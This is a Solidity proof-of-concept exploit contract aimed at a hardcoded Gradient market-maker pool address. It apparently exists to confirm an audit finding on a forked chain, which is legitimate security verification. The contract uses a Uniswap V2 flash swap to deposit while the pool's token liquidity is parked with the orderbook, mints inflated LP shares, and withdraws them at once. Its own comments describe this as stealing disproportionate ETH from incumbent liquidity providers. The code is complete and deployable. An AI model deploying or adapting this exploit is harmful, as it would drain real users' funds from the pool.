// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IGradientRegistryMinimal {
    function gradientToken() external view returns (address);
    function orderbook() external view returns (address);
    function router() external view returns (address);
}

interface IGradientMarketMakerPoolMinimal {
    struct PoolInfo {
        uint256 totalEth;
        uint256 totalToken;
        uint256 totalLiquidity;
        uint256 totalLPShares;
        uint256 accRewardPerShare;
        uint256 rewardBalance;
        address uniswapPair;
    }

    function gradientRegistry() external view returns (address);
    function getPoolInfo(address token) external view returns (PoolInfo memory);
    function getPairAddress(address token) external view returns (address pairAddress);
    function getReserves(address token) external view returns (uint256 reserveETH, uint256 reserveToken);
    function getUserLPShares(address token, address user) external view returns (uint256 lpShares);
    function provideLiquidity(address token, uint256 tokenAmount, uint256 minTokenAmount) external payable;
    function withdrawLiquidity(address token, uint256 shares) external;

    function transferETHToOrderbook(address token, uint256 amount) external;
    function transferTokenToOrderbook(address token, uint256 amount) external;
    function receiveETHFromOrderbook(address token, uint256 amount) external payable;
    function receiveTokenFromOrderbook(address token, uint256 amount) external;
}

interface IUniswapV2PairMinimal {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterMinimal {
    function WETH() external pure returns (address);
}

interface IWETHMinimal {
    function deposit() external payable;
    function transfer(address to, uint256 amount) external returns (bool);
}

contract FlawVerifier {
    address public constant TARGET_POOL = 0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC;
    uint256 private constant BPS = 10_000;

    address private _profitToken;
    uint256 private _profitAmount;

    address public inspectedToken;
    address public registry;
    address public orderbook;
    address public uniswapPair;
    address public router;
    address public weth;

    bool public poolInitialized;
    bool public honestSeedLiquidityDetected;
    bool public parkedLiquidityDetected;
    bool public transferETHToOrderbookPathObserved;
    bool public transferTokenToOrderbookPathObserved;
    bool public attackerDepositPathModeled;
    bool public inflatedMintDetected;
    bool public depositAttempted;
    bool public depositSucceeded;
    bool public attackerControllableReturnLeg;
    bool public hypothesisValidated;

    uint256 public poolTotalEth;
    uint256 public poolTotalToken;
    uint256 public poolTotalLiquidity;
    uint256 public poolTotalLPShares;
    uint256 public reserveEth;
    uint256 public reserveToken;

    uint256 public parkedLiquidityLowerBound;
    uint256 public matchedLiquidityContribution;
    uint256 public matchedEthContribution;
    uint256 public matchedTokenContribution;
    uint256 public simulatedInflatedShares;
    uint256 public actualMintedShares;
    uint256 public retainedLPShares;
    uint256 public financingWithdrawBps;
    uint256 public simulatedShareBpsAfterMint;

    uint256 public constant CANONICAL_PATH_SEED_LIQUIDITY = 1000;
    uint256 public constant CANONICAL_PATH_SEED_SHARES = 1000;
    uint256 public constant CANONICAL_PATH_PARKED_LIQUIDITY = 100;
    uint256 public constant CANONICAL_PATH_ATTACKER_CONTRIBUTION = 100;
    uint256 public constant CANONICAL_PATH_INFLATED_SHARES = (100 * 1000) / 100;

    bytes32 public lastReason;

    uint256 private _startingEth;
    uint256 private _flashBorrowToken;
    uint256 private _repayWethAmount;
    bool private _borrowTokenIsToken0;
    bool private _flashInProgress;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _resetObservations();
        _startingEth = address(this).balance;

        IGradientMarketMakerPoolMinimal pool = IGradientMarketMakerPoolMinimal(TARGET_POOL);
        registry = pool.gradientRegistry();
        if (registry == address(0)) {
            lastReason = keccak256("MISSING_REGISTRY");
            return;
        }

        IGradientRegistryMinimal gradientRegistry = IGradientRegistryMinimal(registry);
        inspectedToken = gradientRegistry.gradientToken();
        orderbook = gradientRegistry.orderbook();
        router = gradientRegistry.router();
        weth = router == address(0) ? address(0) : IUniswapV2RouterMinimal(router).WETH();

        if (inspectedToken == address(0) || router == address(0) || weth == address(0)) {
            lastReason = keccak256("MISSING_TOKEN_OR_ROUTER");
            return;
        }

        IGradientMarketMakerPoolMinimal.PoolInfo memory info = pool.getPoolInfo(inspectedToken);
        poolTotalEth = info.totalEth;
        poolTotalToken = info.totalToken;
        poolTotalLiquidity = info.totalLiquidity;
        poolTotalLPShares = info.totalLPShares;
        uniswapPair = info.uniswapPair == address(0) ? pool.getPairAddress(inspectedToken) : info.uniswapPair;
        poolInitialized = uniswapPair != address(0);

        if (!poolInitialized) {
            lastReason = keccak256("NO_INITIALIZED_POOL_FOR_GRADIENT_TOKEN");
            return;
        }

        honestSeedLiquidityDetected = poolTotalLPShares > 0 && poolTotalLiquidity > 0;
        if (!honestSeedLiquidityDetected) {
            lastReason = keccak256("EMPTY_POOL_AT_FORK");
            return;
        }

        transferETHToOrderbookPathObserved = poolTotalEth == 0 && poolTotalToken > 0;
        transferTokenToOrderbookPathObserved = poolTotalToken == 0 && poolTotalEth > 0;
        parkedLiquidityDetected =
            poolTotalLPShares > poolTotalLiquidity &&
            (transferETHToOrderbookPathObserved || transferTokenToOrderbookPathObserved);
        parkedLiquidityLowerBound = poolTotalLPShares > poolTotalLiquidity ? poolTotalLPShares - poolTotalLiquidity : 0;
        if (!parkedLiquidityDetected) {
            lastReason = keccak256("NO_PARKED_LIQUIDITY_STATE_AT_FORK");
            return;
        }

        (reserveEth, reserveToken) = pool.getReserves(inspectedToken);
        if (reserveEth == 0 || reserveToken == 0) {
            lastReason = keccak256("PAIR_HAS_NO_RESERVES");
            return;
        }

        if (!transferTokenToOrderbookPathObserved) {
            lastReason = keccak256("FORK_NOT_TOKEN_PARKED");
            return;
        }

        if (_startingEth <= 1 wei) {
            lastReason = keccak256("NO_BOOTSTRAP_ETH");
            return;
        }

        matchedEthContribution = (_startingEth * 99) / 100;
        matchedTokenContribution = (matchedEthContribution * reserveToken) / reserveEth;
        matchedLiquidityContribution = matchedEthContribution + matchedTokenContribution;
        attackerDepositPathModeled = matchedEthContribution > 0 && matchedTokenContribution > 0;
        if (!attackerDepositPathModeled) {
            lastReason = keccak256("NO_ATTACKER_DEPOSIT_SIZE_AVAILABLE");
            return;
        }

        simulatedInflatedShares = (matchedLiquidityContribution * poolTotalLPShares) / poolTotalLiquidity;
        inflatedMintDetected = simulatedInflatedShares > matchedLiquidityContribution;
        if (poolTotalLPShares + simulatedInflatedShares > 0) {
            simulatedShareBpsAfterMint = (simulatedInflatedShares * BPS) / (poolTotalLPShares + simulatedInflatedShares);
        }

        if (!inflatedMintDetected) {
            lastReason = keccak256("NO_INFLATED_MINT_FOR_MATCHING_DEPOSIT");
            return;
        }

        _flashBorrowToken = matchedTokenContribution;
        _repayWethAmount = _getAmountIn(_flashBorrowToken, reserveEth, reserveToken);

        IUniswapV2PairMinimal pair = IUniswapV2PairMinimal(uniswapPair);
        _borrowTokenIsToken0 = pair.token0() == inspectedToken;

        uint256 amount0Out = _borrowTokenIsToken0 ? _flashBorrowToken : 0;
        uint256 amount1Out = _borrowTokenIsToken0 ? 0 : _flashBorrowToken;

        try this._kickoffFlashSwap(amount0Out, amount1Out) {
            retainedLPShares = IGradientMarketMakerPoolMinimal(TARGET_POOL).getUserLPShares(inspectedToken, address(this));
            attackerControllableReturnLeg = false;
            hypothesisValidated = depositSucceeded && actualMintedShares > matchedLiquidityContribution;

            if (address(this).balance > _startingEth) {
                _profitToken = address(0);
                _profitAmount = address(this).balance - _startingEth;
                lastReason = keccak256("ETH_PROFIT_REALIZED_FROM_INFLATED_SHARES");
            } else if (IERC20Minimal(inspectedToken).balanceOf(address(this)) > 0) {
                _profitToken = inspectedToken;
                _profitAmount = IERC20Minimal(inspectedToken).balanceOf(address(this));
                lastReason = keccak256("TOKEN_PROFIT_REALIZED_FROM_INFLATED_SHARES");
            } else if (lastReason == bytes32(0)) {
                lastReason = keccak256("NO_REALIZED_PROFIT");
            }
        } catch {
            lastReason = keccak256("FLASH_SWAP_EXECUTION_FAILED");
        }
    }

    function _kickoffFlashSwap(uint256 amount0Out, uint256 amount1Out) external {
        require(msg.sender == address(this), "SELF_ONLY");
        _flashInProgress = true;
        IUniswapV2PairMinimal(uniswapPair).swap(amount0Out, amount1Out, address(this), abi.encode(_flashBorrowToken));
        _flashInProgress = false;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(_flashInProgress, "NO_FLASH_IN_PROGRESS");
        require(msg.sender == uniswapPair, "UNAUTHORIZED_PAIR");
        require(sender == address(this), "UNAUTHORIZED_SENDER");

        uint256 borrowedTokenAmount = _borrowTokenIsToken0 ? amount0 : amount1;
        require(borrowedTokenAmount >= _flashBorrowToken, "INSUFFICIENT_FLASH_TOKENS");

        IGradientMarketMakerPoolMinimal pool = IGradientMarketMakerPoolMinimal(TARGET_POOL);

        uint256 sharesBefore = pool.getUserLPShares(inspectedToken, address(this));
        uint256 ethToUse = matchedEthContribution;
        uint256 tokenToUse = matchedTokenContribution;

        uint256 currentTokenBalance = IERC20Minimal(inspectedToken).balanceOf(address(this));
        if (tokenToUse > currentTokenBalance) {
            tokenToUse = currentTokenBalance;
            ethToUse = (tokenToUse * reserveEth) / reserveToken;
        }

        if (ethToUse == 0 || tokenToUse == 0) {
            revert("ZERO_CONTRIBUTION");
        }

        depositAttempted = true;
        _approve(inspectedToken, TARGET_POOL, tokenToUse);
        pool.provideLiquidity{value: ethToUse}(inspectedToken, tokenToUse, tokenToUse);

        uint256 sharesAfterDeposit = pool.getUserLPShares(inspectedToken, address(this));
        actualMintedShares = sharesAfterDeposit - sharesBefore;
        depositSucceeded = actualMintedShares > 0;
        require(depositSucceeded, "NO_SHARES_MINTED");

        // The bugged causality remains the same as the finding:
        // 1) Incumbent LP shares stay unchanged.
        // 2) `transferTokenToOrderbook` depresses `pool.totalLiquidity` while parked inventory sits outside the pool.
        // 3) The attacker deposits against the shrunken denominator and receives inflated LP shares.
        // 4) Those inflated shares can then be redeemed for an outsized slice of the still-present assets.
        //
        // On this fork, the token side is the parked asset, while ETH is still sitting inside the pool.
        // That means the attacker does not need to wait for the later orderbook return to monetize the dilution:
        // a full withdrawal immediately steals disproportionate ETH from incumbent LPs. The eventual orderbook
        // return would only make the over-mint even more valuable, but it is not required to realize profit here.
        financingWithdrawBps = BPS;
        pool.withdrawLiquidity(inspectedToken, financingWithdrawBps);
        retainedLPShares = pool.getUserLPShares(inspectedToken, address(this));

        require(address(this).balance >= _repayWethAmount, "INSUFFICIENT_ETH_TO_REPAY");
        IWETHMinimal(weth).deposit{value: _repayWethAmount}();
        _transferToken(weth, uniswapPair, _repayWethAmount);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function reason() external view returns (bytes32) {
        return lastReason;
    }

    function summary()
        external
        view
        returns (
            address token,
            bool preconditionsMet,
            bool attackerDepositModeled,
            bool inflatedShares,
            bool returnLegReachable,
            bool validated,
            uint256 shareBpsAfterMint,
            bytes32 blocker
        )
    {
        return (
            inspectedToken,
            parkedLiquidityDetected,
            attackerDepositPathModeled,
            inflatedMintDetected,
            attackerControllableReturnLeg,
            hypothesisValidated,
            simulatedShareBpsAfterMint,
            lastReason
        );
    }

    function _resetObservations() internal {
        _profitToken = address(0);
        _profitAmount = 0;

        inspectedToken = address(0);
        registry = address(0);
        orderbook = address(0);
        uniswapPair = address(0);
        router = address(0);
        weth = address(0);

        poolInitialized = false;
        honestSeedLiquidityDetected = false;
        parkedLiquidityDetected = false;
        transferETHToOrderbookPathObserved = false;
        transferTokenToOrderbookPathObserved = false;
        attackerDepositPathModeled = false;
        inflatedMintDetected = false;
        depositAttempted = false;
        depositSucceeded = false;
        attackerControllableReturnLeg = false;
        hypothesisValidated = false;

        poolTotalEth = 0;
        poolTotalToken = 0;
        poolTotalLiquidity = 0;
        poolTotalLPShares = 0;
        reserveEth = 0;
        reserveToken = 0;

        parkedLiquidityLowerBound = 0;
        matchedLiquidityContribution = 0;
        matchedEthContribution = 0;
        matchedTokenContribution = 0;
        simulatedInflatedShares = 0;
        actualMintedShares = 0;
        retainedLPShares = 0;
        financingWithdrawBps = 0;
        simulatedShareBpsAfterMint = 0;

        lastReason = bytes32(0);

        _startingEth = 0;
        _flashBorrowToken = 0;
        _repayWethAmount = 0;
        _borrowTokenIsToken0 = false;
        _flashInProgress = false;
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut > 0, "INVALID_AMOUNT_OUT");
        require(reserveIn > 0 && reserveOut > amountOut, "INVALID_RESERVES");

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _approve(address token, address spender, uint256 amount) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }

    function _transferToken(address token, address to, uint256 amount) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }
}
